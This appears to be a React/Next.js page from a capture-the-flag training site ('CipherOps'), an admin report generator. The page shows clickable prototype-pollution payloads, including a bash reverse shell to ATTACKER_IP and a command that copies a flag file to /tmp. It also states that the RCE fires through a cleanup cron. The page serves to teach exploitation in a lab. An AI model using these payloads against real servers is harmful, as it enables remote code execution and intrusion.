import { useState, useEffect } from 'react';
import Head from 'next/head';
import Link from 'next/link';

const S = {
  nav: {
    display: 'flex', justifyContent: 'space-between', alignItems: 'center',
    padding: '14px 40px', background: '#0d1117', borderBottom: '1px solid #21262d'
  },
  logo: { color: '#58a6ff', fontWeight: 'bold', fontSize: '1.15rem', fontFamily: 'monospace' },
  main: { maxWidth: '860px', margin: '48px auto', padding: '0 24px' },
  header: { marginBottom: '32px' },
  title: { fontSize: '1.5rem', fontWeight: 700, color: '#e6edf3', marginBottom: '6px' },
  sub: { color: '#8b949e', fontSize: '0.875rem' },
  card: {
    background: '#161b22', border: '1px solid #21262d', borderRadius: '12px', padding: '32px', marginBottom: '24px'
  },
  warningBanner: {
    display: 'flex', alignItems: 'flex-start', gap: '12px',
    background: '#2d1a00', border: '1px solid #9e6300', borderRadius: '8px',
    padding: '14px 18px', marginBottom: '24px', fontSize: '0.85rem', color: '#e3b341'
  },
  payloadNote: {
    background: '#010409', border: '1px solid #21262d', borderRadius: '8px',
    padding: '16px', marginBottom: '24px'
  },
  payloadTitle: { color: '#8b949e', fontSize: '0.78rem', fontFamily: 'monospace', marginBottom: '10px' },
  pre: {
    color: '#7ee787', fontFamily: 'monospace', fontSize: '0.78rem',
    overflow: 'auto', whiteSpace: 'pre', cursor: 'pointer'
  },
  label: { display: 'block', color: '#8b949e', fontSize: '0.78rem', fontFamily: 'monospace', marginBottom: '6px' },
  textarea: {
    width: '100%', minHeight: '200px', padding: '14px', background: '#0d1117',
    border: '1px solid #30363d', borderRadius: '8px', color: '#c9d1d9',
    fontFamily: 'monospace', fontSize: '0.82rem', resize: 'vertical', outline: 'none',
    boxSizing: 'border-box'
  },
  actions: { display: 'flex', gap: '12px', marginTop: '16px', flexWrap: 'wrap' },
  btnPrimary: {
    padding: '10px 24px', background: '#238636', border: 'none',
    borderRadius: '8px', color: '#fff', cursor: 'pointer', fontWeight: 600, fontSize: '0.9rem'
  },
  btnReset: {
    padding: '10px 24px', background: 'transparent', border: '1px solid #30363d',
    borderRadius: '8px', color: '#8b949e', cursor: 'pointer', fontSize: '0.9rem'
  },
  resBox: {
    marginTop: '20px', padding: '16px', background: '#0d1117',
    border: '1px solid #30363d', borderRadius: '8px'
  },
  errBox: {
    marginTop: '16px', padding: '12px 16px', background: '#2d1a1a',
    border: '1px solid #6e2b2b', borderRadius: '8px', color: '#f85149', fontSize: '0.875rem'
  },
  forbidden: { textAlign: 'center', padding: '80px 24px', color: '#8b949e' }
};

const REVERSE_SHELL_PAYLOAD = JSON.stringify({
  reportType: 'pentest',
  options: {
    '__proto__': {
      shell:     'bash',
      shellArgs: ['-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1']
    }
  }
}, null, 2);

const READ_FLAG_PAYLOAD = JSON.stringify({
  reportType: 'pentest',
  options: {
    '__proto__': {
      shell:     'sh',
      shellArgs: ['-c', 'cat /var/www/flag2.txt > /tmp/f && chmod 777 /tmp/f']
    }
  }
}, null, 2);

export default function ReportGenerator() {
  const [user, setUser]       = useState(null);
  const [loading, setLoading] = useState(true);
  const [payload, setPayload] = useState(JSON.stringify({ reportType: 'standard', options: {} }, null, 2));
  const [result, setResult]   = useState(null);
  const [error, setError]     = useState('');
  const [sending, setSending] = useState(false);

  useEffect(() => {
    fetch('/api/v1/auth/session', { credentials: 'include' })
      .then(r => r.json())
      .then(({ user }) => { setUser(user); setLoading(false); })
      .catch(() => setLoading(false));
  }, []);

  async function generate(e) {
    e.preventDefault();
    setSending(true);
    setError('');
    setResult(null);

    try {
      const parsed = JSON.parse(payload);
      const res    = await fetch('/api/v1/report/generate', {
        method:      'POST',
        headers:     { 'Content-Type': 'application/json' },
        credentials: 'include',
        body:        JSON.stringify(parsed)
      });
      const data = await res.json();

      if (res.ok) {
        setResult(data);
      } else {
        setError(data.error || 'Request failed.');
      }
    } catch (err) {
      setError('JSON parse error: ' + err.message);
    } finally {
      setSending(false);
    }
  }

  if (loading) return <div style={S.forbidden}>Loading…</div>;

  if (!user || !user.is_admin) {
    return (
      <>
        <Head><title>CipherOps | Forbidden</title></Head>
        <nav style={S.nav}>
          <Link href="/" style={{ ...S.logo, textDecoration: 'none' }}>⚡ CipherOps</Link>
        </nav>
        <div style={S.forbidden}>
          <h2 style={{ color: '#f85149', marginBottom: '12px' }}>403 – Forbidden</h2>
          <p>Admin clearance required. <Link href="/dashboard">Return to dashboard</Link>.</p>
        </div>
      </>
    );
  }

  return (
    <>
      <Head>
        <title>CipherOps | Report Generator</title>
      </Head>

      <nav style={S.nav}>
        <Link href="/" style={{ ...S.logo, textDecoration: 'none' }}>⚡ CipherOps</Link>
        <Link href="/dashboard" style={{ color: '#8b949e', fontSize: '0.9rem' }}>← Dashboard</Link>
      </nav>

      <main style={S.main}>
        <div style={S.header}>
          <h1 style={S.title}>Report Generator</h1>
          <p style={S.sub}>Admin-only. Generate consultant assessment reports with custom options.</p>
        </div>

        <div style={S.warningBanner}>
          <span>⚠️</span>
          <span>
            <strong>Internal Tool.</strong> Report options are merged into the server configuration
            using a third-party library. Ensure JSON input is trusted before submission.
          </span>
        </div>

        {/* Sample exploit payloads for players to reference */}
        <div style={S.card}>
          <h3 style={{ color: '#8b949e', fontSize: '0.85rem', fontFamily: 'monospace', marginBottom: '12px' }}>
            EXAMPLE PAYLOADS (click to load)
          </h3>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
            <div style={S.payloadNote}>
              <div style={S.payloadTitle}>► Reverse Shell (replace ATTACKER_IP/PORT)</div>
              <pre style={S.pre} onClick={() => setPayload(REVERSE_SHELL_PAYLOAD)}>
                {REVERSE_SHELL_PAYLOAD}
              </pre>
            </div>
            <div style={S.payloadNote}>
              <div style={S.payloadTitle}>► Read Flag 3 to /tmp/f</div>
              <pre style={S.pre} onClick={() => setPayload(READ_FLAG_PAYLOAD)}>
                {READ_FLAG_PAYLOAD}
              </pre>
            </div>
          </div>
        </div>

        {/* Main form */}
        <div style={S.card}>
          <form onSubmit={generate}>
            <label style={S.label}>REQUEST BODY (JSON)</label>
            <textarea
              value={payload}
              onChange={e => setPayload(e.target.value)}
              style={S.textarea}
              spellCheck={false}
            />

            <div style={S.actions}>
              <button type="submit" style={S.btnPrimary} disabled={sending}>
                {sending ? 'Sending…' : '▶ Generate Report'}
              </button>
              <button
                type="button"
                style={S.btnReset}
                onClick={() => { setPayload(JSON.stringify({ reportType: 'standard', options: {} }, null, 2)); setResult(null); setError(''); }}
              >
                Reset
              </button>
            </div>
          </form>

          {error  && <div style={S.errBox}>{error}</div>}

          {result && (
            <div style={S.resBox}>
              <div style={{ color: '#8b949e', fontSize: '0.78rem', fontFamily: 'monospace', marginBottom: '8px' }}>
                RESPONSE
              </div>
              <pre style={{ color: '#7ee787', fontFamily: 'monospace', fontSize: '0.8rem', overflow: 'auto' }}>
                {JSON.stringify(result, null, 2)}
              </pre>
              {result.status === 'queued' && (
                <p style={{ color: '#e3b341', fontSize: '0.85rem', marginTop: '12px' }}>
                  ⏱ RCE payload executes via the cleanup cron within ~30 seconds.
                </p>
              )}
            </div>
          )}
        </div>
      </main>
    </>
  );
}
